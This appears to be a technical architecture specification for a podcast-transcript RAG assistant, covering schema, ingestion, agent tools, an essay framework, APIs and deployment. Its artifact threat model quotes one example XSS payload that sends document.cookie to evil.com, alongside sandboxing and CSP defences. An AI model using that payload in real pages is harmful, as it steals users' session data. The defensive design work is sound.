# System Architecture Specification
## The Lenny Growth Assistant

**Document Version:** 1.0.0  
**Status:** Approved Technical Architecture  
**Author:** Senior Full-Stack AI Engineer & System Architect  

---

## 1. System Topology Overview

The Lenny Growth Assistant is built as a modular, decoupled full-stack architecture consisting of five core subsystems:

```
+---------------------------------------------------------------------------------------+
|                                    REACT FRONTEND                                     |
|                       (Vite, TypeScript, Tailwind CSS, Lucide)                        |
|   +-----------------------+   +-----------------------+   +-----------------------+   |
|   |   Sidebar & Sessions  |   |    Chat & Streaming   |   |    Artifact Studio    |   |
|   +-----------------------+   +-----------------------+   +-----------------------+   |
+-------------------------------------------|-------------------------------------------+
                                            | REST API (HTTP / JSON)
+-------------------------------------------v-------------------------------------------+
|                                    FASTAPI BACKEND                                    |
|   +-------------------------------------------------------------------------------+   |
|   | Versioned API Routers (/api/v1/sessions, /chat, /essays, /artifacts, /config) |   |
|   +-------------------------------------------------------------------------------+   |
|                                           |                                           |
|   +---------------------------------------v---------------------------------------+   |
|   |                              AGENT ORCHESTRATOR                               |   |
|   |  - Anthropic Claude Agent SDK Tool Runtime (Cloud)                            |   |
|   |  - Deterministic Routing & Provider Adapter (Local Ollama / OpenAI)           |   |
|   |  - Dedicated Skills & Tools:                                                  |   |
|   |     * Retrieval Tool (ChromaDB Vector Store)                                  |   |
|   |     * Ship 30 for 30 Long-Form Essay Skill (~1,250 words)                     |   |
|   |     * Artifact Generation Engine (Markdown & Sandboxed HTML/CSS)              |   |
|   +-------------------------------------------------------------------------------+   |
|                       |                                   |                           |
|   +-------------------v---------------+   +---------------v---------------+           |
|   |       RAG RETRIEVAL ENGINE        |   |      MODEL PROVIDER LAYER     |           |
|   |  - ChromaDB Vector Store          |   |  - Local Ollama (llama3.2/    |           |
|   |  - MiniLM / ONNX Embeddings       |   |    qwen2.5)                   |           |
|   |  - Transcript Chunk Metadata      |   |  - Anthropic Claude 3.5       |           |
|   |  - Cosine Similarity & Threshold  |   |  - OpenAI GPT-4o              |           |
|   +-----------------------------------+   +-------------------------------+           |
+---------------------------------------------------------------------------------------+
        |                                                   |
+-------v-------------------------------+   +---------------v---------------------------+
|          RELATIONAL DATABASE          |   |            PERSISTENT STORAGE             |
|  - PostgreSQL 16 (via SQLAlchemy)     |   |  - data/chroma_db/ (Vector indices)       |
|  - SQLite Fallback for Local Dev      |   |  - data/lenny_repo/ (Transcripts corpus)  |
|  - Alembic Schema Migrations          |   |  - agent_logs/ (Observability records)    |
+---------------------------------------+   +-------------------------------------------+
```

---

## 2. Database Schema (PostgreSQL & SQLAlchemy ORM)

All relational entities use UUID primary keys for collision resistance across distributed sessions. The schema is defined using SQLAlchemy 2.0 and versioned with Alembic.

### 2.1 Table: `sessions`
Represents an independent conversation thread.
| Column | Type | Constraints | Description |
| :--- | :--- | :--- | :--- |
| `id` | `VARCHAR(36)` | Primary Key (UUIDv4) | Unique session identifier |
| `title` | `VARCHAR(255)` | NOT NULL | Human-readable session title (auto-generated) |
| `user_id` | `VARCHAR(64)` | Default: `'anonymous'` | User/tenant identifier |
| `provider` | `VARCHAR(32)` | NOT NULL, Default: `'ollama'` | Active model provider (`ollama`, `anthropic`, `openai`) |
| `model_name` | `VARCHAR(64)` | NOT NULL | Active model identifier (e.g. `llama3.2:3b`) |
| `created_at` | `TIMESTAMP` | Default: UTC NOW | Session creation timestamp |
| `updated_at` | `TIMESTAMP` | Default: UTC NOW | Last activity timestamp |

### 2.2 Table: `messages`
Represents user and assistant messages in a session.
| Column | Type | Constraints | Description |
| :--- | :--- | :--- | :--- |
| `id` | `VARCHAR(36)` | Primary Key (UUIDv4) | Unique message identifier |
| `session_id` | `VARCHAR(36)` | Foreign Key (`sessions.id`, ON DELETE CASCADE) | Parent session |
| `role` | `VARCHAR(16)` | NOT NULL (`user`, `assistant`, `system`) | Role of sender |
| `content` | `TEXT` | NOT NULL | Full message body (Markdown formatted) |
| `citations` | `JSON` | Nullable, Default: `[]` | Array of source citation objects |
| `created_at` | `TIMESTAMP` | Default: UTC NOW | Message creation timestamp |

**Citation Object Schema:**
```json
{
  "guest": "Brian Chesky",
  "title": "Brian Chesky’s new playbook",
  "episode_url": "https://www.youtube.com/watch?v=4ef0juAMqoE",
  "publish_date": "2023-11-12",
  "chunk_id": "brian-chesky-chunk-004",
  "snippet": "Being in the details is what every responsible company's board does to the CEO..."
}
```

### 2.3 Table: `artifacts`
Stores documents, essays, and HTML/CSS components generated during conversations.
| Column | Type | Constraints | Description |
| :--- | :--- | :--- | :--- |
| `id` | `VARCHAR(36)` | Primary Key (UUIDv4) | Unique artifact identifier |
| `session_id` | `VARCHAR(36)` | Foreign Key (`sessions.id`, ON DELETE CASCADE) | Associated session |
| `message_id` | `VARCHAR(36)` | Foreign Key (`messages.id`, ON DELETE SET NULL) | Originating message |
| `title` | `VARCHAR(255)` | NOT NULL | Title of artifact |
| `artifact_type`| `VARCHAR(32)` | NOT NULL (`markdown`, `html`) | MIME/rendering category |
| `content` | `TEXT` | NOT NULL | Full raw content |
| `created_at` | `TIMESTAMP` | Default: UTC NOW | Creation timestamp |

---

## 3. RAG Knowledge Base Architecture

### 3.1 Source Dataset Inspection
The source corpus is located in `data/lenny_repo/episodes/` containing 303 podcast episodes. Each episode directory contains a standardized `transcript.md` with YAML frontmatter:
```yaml
---
guest: Brian Chesky
title: Brian Chesky’s new playbook
youtube_url: https://www.youtube.com/watch?v=4ef0juAMqoE
video_id: 4ef0juAMqoE
publish_date: 2023-11-12
description: '...'
duration_seconds: 4408.0
keywords:
  - growth
  - prioritization
---
```

### 3.2 Ingestion Pipeline
1. **Frontmatter Extraction:** `python-frontmatter` / `pyyaml` parses guest name, episode title, publication date, and YouTube URL.
2. **Text Cleaning:**
   - Strips sponsor promotional blocks (e.g. "This episode is brought to you by Sidebar...", Jira ads).
   - Normalizes speaker turn timestamps (e.g. `Lenny (00:01:01):`).
3. **Chunking Strategy:**
   - Target chunk size: 700 to 1,000 tokens (approx. 2,800 to 4,000 characters).
   - Overlap: 150 tokens (approx. 600 characters) to preserve contextual transitions across speaker turns.
   - Computes SHA256 content hash per chunk for idempotent incremental updates.
4. **Vector Indexing (ChromaDB):**
   - Collection name: `lenny_transcripts`.
   - Embeddings: Standard high-performance ONNX embeddings / Sentence Transformers `all-MiniLM-L6-v2`.
   - Stored Metadata: `guest`, `title`, `youtube_url`, `publish_date`, `chunk_id`, `chunk_index`.

---

## 4. Agent Architecture & Tool Integration

### 4.1 Anthropic Claude Agent SDK Integration
When the cloud provider (`anthropic`) is selected and `ANTHROPIC_API_KEY` is present, the agent layer uses Anthropic's official SDK tool-use agent protocol with dedicated tools:
1. `search_transcripts(query: str, top_k: int = 5)`: Semantic vector retrieval across the transcript knowledge base.
2. `generate_essay(topic: str, context: str)`: Executes the Ship 30 for 30 essay framework to author a ~1,250-word piece.
3. `create_artifact(title: str, artifact_type: str, content: str)`: Generates Markdown or HTML/CSS artifacts for side-by-side rendering.

### 4.2 Documented Provider Adapter for Local Ollama
Because Ollama models (`llama3.2:3b`, `qwen2.5:3b`) do not natively execute the Anthropic Claude Agent SDK agent loop:
- The system employs a dedicated **Agent Provider Adapter** (`app/agents/adapter.py`).
- The adapter implements deterministic intent routing:
  - When the user query explicitly requests an essay ("Write an essay about...", "Ship 30 for 30..."), it routes through the `Ship30EssaySkill`.
  - When the query requests an artifact ("Create an HTML card...", "Generate a PRD..."), it routes through the `ArtifactSkill`.
  - When a conversational question is asked, it queries the `TranscriptRetrievalTool` for top-$k$ evidence and constructs a grounded prompt with explicit citation constraints.
- This design provides clear transparency: we do not misrepresent ordinary Ollama inference as Anthropic SDK execution, while maintaining an identical unified agent tool contract.

---

## 5. Ship 30 for 30 Writing Skill Specification

### 5.1 Official Framework & Principles
Derived from Dickie Bush & Nicolas Cole's Ship 30 for 30 digital writing methodology:
1. **The Atomic Essay & Long-Form Expansion:** Expanding focused atomic structures into comprehensive ~1,250-word deep-dive articles.
2. **The 10 Required Structural Milestones:**
   1. **Compelling Title:** Clear, provocative, outcome-oriented title.
   2. **Strong Opening Hook:** Captures immediate reader attention in under 3 sentences.
   3. **Clear Problem or Tension:** Highlights the pain point or misconception in product/growth.
   4. **Relevant Insights Grounded in Podcast Transcripts:** Directly integrates ideas from verified guests (e.g. Brian Chesky on founder-mode roadmaps, Marty Cagan on product teams vs feature teams).
   5. **Logical Narrative Progression:** Transitions seamlessly across foundational context, strategic shifts, and operational execution.
   6. **Skimmable Headings:** Uses descriptive, punchy headers and the "1-3-1" cadence.
   7. **Selective Bold Emphasis:** Bolds key takeaways for effortless visual scanning.
   8. **Real-World Examples Supported by Retrieved Material:** Cites concrete company stories (Airbnb, Figma, Linear, Spotify) mentioned in the transcripts.
   9. **Actionable Lessons:** Numbered or bulleted tactical steps a PM or founder can deploy immediately.
   10. **Specific Concluding Takeaway:** Memorable final synthesis that leaves a lasting impression.
3. **Word Count Target:** Approximately 1,250 words (calibrated between 1,100 and 1,400 words).

---

## 6. Artifact Security & Threat Model

### 6.1 Threat Vectors
1. **Malicious Script Execution (XSS):** If an LLM generates `<script>fetch('http://evil.com?c=' + document.cookie)</script>`, executing it in the main application DOM could steal data.
2. **DOM Traversal & Clickjacking:** Untrusted HTML navigating `window.parent` or overlaying phishing forms.
3. **Storage & Cookie Theft:** Reading `localStorage` session tokens.

### 6.2 Defense-in-Depth Mitigations
1. **Strict Iframe Sandboxing:**
   ```html
   <iframe
     sandbox="allow-popups"
     srcdoc="...sanitized_html_with_csp..."
     title="Artifact Preview"
   />
   ```
   - Notice: `allow-scripts` is **OMITTED**.
   - `allow-same-origin` is **OMITTED**.
   - `allow-forms` is **OMITTED**.
   - `allow-top-navigation` is **OMITTED**.
2. **Embedded Content Security Policy (CSP):**
   ```html
   <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data: https:; font-src data:;">
   ```
3. **Markdown Sanitization:** Client-side parsing uses `DOMPurify` to ensure zero unsanitized HTML escapes into the parent application.

---

## 7. API Contracts (FastAPI v1)

- `GET /health` -> `{"status": "ok", "timestamp": "..."}`
- `GET /ready` -> `{"status": "ready", "database": true, "ollama": true, "indexed_chunks": 1420}`
- `POST /api/v1/sessions` -> Create session `{"title": "...", "provider": "ollama", "model_name": "llama3.2:3b"}`
- `GET /api/v1/sessions` -> List all sessions
- `GET /api/v1/sessions/{id}` -> Retrieve session with messages & artifacts
- `DELETE /api/v1/sessions/{id}` -> Delete session
- `POST /api/v1/chat` -> Send message & receive grounded response with citations
- `POST /api/v1/essays` -> Generate Ship 30 for 30 essay
- `POST /api/v1/artifacts` -> Generate Markdown or HTML artifact
- `GET /api/v1/artifacts/{id}` -> Retrieve artifact
- `GET /api/v1/config` -> Safe configuration status (active provider, available models, Ollama status)
- `GET /api/v1/knowledge/status` -> Total episodes, indexed chunks, last updated

---

## 8. Deployment Topology

### 8.1 Docker Compose Deployment
- `postgres:16-alpine`: PostgreSQL database on port 5432 with persistent volume `postgres_data`.
- `backend`: FastAPI service on port 8000.
- `frontend`: React / Nginx or Vite production preview on port 3000.
- Supports both containerized Ollama or `host.docker.internal:11434` for existing host Ollama installations.

### 8.2 Local Host Development (No Docker)
- Evaluator can run backend with `python -m uvicorn app.main:app --reload --port 8000` (SQLite fallback automatic if PostgreSQL is not running).
- Evaluator can run frontend with `npm run dev` on `http://localhost:5173`.
- Fully documented in `README.md`.
